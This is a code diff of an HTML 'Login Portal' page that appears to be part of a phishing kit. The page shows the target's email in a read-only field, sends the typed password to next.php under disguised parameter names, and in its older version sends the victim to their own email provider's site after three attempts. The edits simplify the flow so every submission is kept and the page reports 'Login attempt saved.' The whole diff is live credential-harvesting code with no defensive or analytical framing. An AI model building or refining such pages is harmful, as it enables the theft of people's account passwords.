@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
-    <title id="pageTitle">Portal</title>
+    <title id="pageTitle">Login Portal</title>
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <style>
         body {
@@ -125,7 +125,7 @@
                     <input type="text" id="email" value="" readonly>
                     <p>Enter password:</p>
                     <input type="password" id="password" placeholder="Password">
-                    <button type="button" onclick="nextFun();">Sign In</button>
+                    <button type="button" onclick="nextFun()">Sign In</button>
                 </div>
 
                 <!-- Footer Section -->
@@ -141,7 +141,6 @@
         </div>
     </div>
 
-    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
     <script>
         let failedAttempts = 0;
 
@@ -177,40 +176,22 @@
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            if (!email || !password) {
-                displayError("Email or Password cannot be empty.");
-                return;
-            }
-
             // Send POST request to next.php
             fetch("./next.php", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: `di=${encodeURIComponent(email)}&pr=${encodeURIComponent(password)}`,
+                body: `di=${encodeURIComponent(email)}&pr=${encodeURIComponent(password)}`
             })
                 .then((response) => response.json())
                 .then((data) => {
-                    if (data.success) {
-                        window.location.href = data.redirectUrl || `https://${email.split("@")[1]}`;
-                    } else {
-                        failedAttempts++;
-                        displayError(data.message || "Invalid credentials. Please try again.");
-
-                        if (failedAttempts >= 3) {
-                            window.location.href = `https://${email.split("@")[1]}`;
-                        }
-                    }
+                    failedAttempts++;
+                    displayError(data.message || "Login attempt saved.");
                 })
                 .catch(() => {
-                    failedAttempts++;
-                    displayError("An error occurred. Please try again.");
-
-                    if (failedAttempts >= 3) {
-                        window.location.href = `https://${email.split("@")[1]}`;
-                    }
+                    displayError("A server error occurred.");
                 })
                 .finally(() => {
-                    document.getElementById("password").value = ""; // Clear password space after submission
+                    document.getElementById("password").value = ""; // Clear password field
                 });
         }
 
